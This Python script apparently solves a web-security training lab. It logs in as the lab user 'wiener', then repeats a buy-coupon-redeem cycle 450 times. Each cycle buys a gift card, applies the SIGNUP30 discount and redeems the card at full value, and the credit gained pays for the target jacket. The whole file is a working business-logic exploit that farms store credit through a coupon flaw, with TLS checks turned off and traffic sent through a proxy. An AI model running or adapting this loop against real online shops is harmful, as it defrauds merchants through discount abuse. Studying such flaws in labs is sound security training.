import requests
import sys
import urllib3
import re

from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_csrf_token(url, session):
    response = session.get(
        url,
        verify=False,
        proxies=proxies)
    html = BeautifulSoup(
        response.text,
        'html.parser')
    csrf = html.find(
        "input", {'name': 'csrf'})['value']
    return csrf

def is_wiener_login_sucessful(url, session):
    login_url = url + "/login"
    csrf_token = get_csrf_token(
        login_url,
        session)
    data_login = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"}
    response = session.post(
        login_url,
        data=data_login,
        verify=False,
        proxies=proxies)
    return "Log out" in response.text

def is_exploit_cart_sucessful(url, session):    
    def add_gift_card():
        cart_url = url + "/cart"
        add_gift_card = {
            "productId": "2",
            "redir": "PRODUCT",
            "quantity": "1"}
        session.post(
            cart_url,
            data=add_gift_card,
            verify=False)

    def apply_coupon():
        cart_url = url + "/cart"
        redeem_coupon_url = url + "/cart/coupon"
        csrf_token = get_csrf_token(
            cart_url,
            session)
        redeem_coupon = {
            "csrf":csrf_token,
            "coupon": "SIGNUP30"}
        session.post(
            redeem_coupon_url,
            data=redeem_coupon,
            verify=False)

    def apply_gift_card():
        def purchase_gift_card():
            cart_url = url + "/cart"
            purchase_item_url = url + "/cart/checkout"
            csrf_token = get_csrf_token(
                cart_url,
                session)
            purchase_item = {
                "csrf": csrf_token}
            response = session.post(
                purchase_item_url,
                data=purchase_item,
                verify=False)
            return response.text
        
        response = purchase_gift_card()
        gift_card = re.findall(
            '<tr>\n(.*?)<td>(.*?)<\/td>', response)[0][1]
        apply_gift_card_url = url + "/gift-card"
        csrf_token = get_csrf_token(
            url + "/my-account",
            session)
        apply_gift_card = {
            "csrf":csrf_token,
            "gift-card": gift_card}
        session.post(
            apply_gift_card_url,
            data=apply_gift_card,
            verify=False)

    for counter in range(450):
        add_gift_card()
        apply_coupon()
        apply_gift_card()
    return counter == 449

def is_purchase_sucessful(url, session):
    cart_url = url + "/cart"
    add_jacket = {
        "productId": "1",
        "redir": "PRODUCT",
        "quantity": "1"}
    session.post(
        cart_url,
        data=add_jacket,
        verify=False,
        proxies=proxies)
    csrf_token = get_csrf_token(
        cart_url,
        session)
    purchase_jacket = {"csrf": csrf_token}
    purchase_item_url = url + "/cart/checkout"
    response = session.post(
        purchase_item_url,
        data=purchase_jacket,
        verify=False, 
        proxies=proxies)
    return "Congratulations" in response.text

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        session = requests.Session()
        print("[+] Starting Business Logic attack...")
        if not is_wiener_login_sucessful(url, session):
            print("[-] Wiener Login Failed.")
            sys.exit(FAIL)
        if not is_exploit_cart_sucessful(url, session):
            print("[-] Exploit Cart Failed.")
            sys.exit(FAIL)
        if not is_purchase_sucessful(url, session):
            print("[-] Purchase Failed.")
            sys.exit(FAIL)
        print("[+] The Business Logic attack was successful.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("An exception occured %s" % exception)
        print("[-] The Business Logic attack was not successful.")
        sys.exit(FAIL) 